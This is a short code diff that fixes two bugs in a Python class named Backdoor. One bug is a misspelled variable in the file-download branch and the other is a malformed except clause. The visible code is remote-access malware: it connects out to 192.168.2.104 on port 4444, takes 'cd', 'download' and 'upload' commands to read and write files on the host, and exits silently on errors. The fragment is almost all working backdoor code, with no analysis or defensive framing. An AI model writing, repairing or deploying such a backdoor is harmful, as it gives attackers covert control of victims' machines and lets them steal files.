@@ -61,7 +61,7 @@ class Backdoor:
                 elif command[0] == "cd" and len(command) > 1:
                     self.change_working_directory_to(command[1])
                 elif command[0] == "download":
-                    command_result = self.read_file(commmand[1])
+                    command_result = self.read_file(command[1])
                 elif command[0] == "upload":
                     command_result = self.write_file(command[1], command[2])
                 else:
@@ -73,7 +73,7 @@ class Backdoor:
 try:
     my_backdoor = Backdoor("192.168.2.104", 4444)
     my_backdoor.run()
-except: Exception:
+except Exception:
     sys.exit()
 
 # Serialization
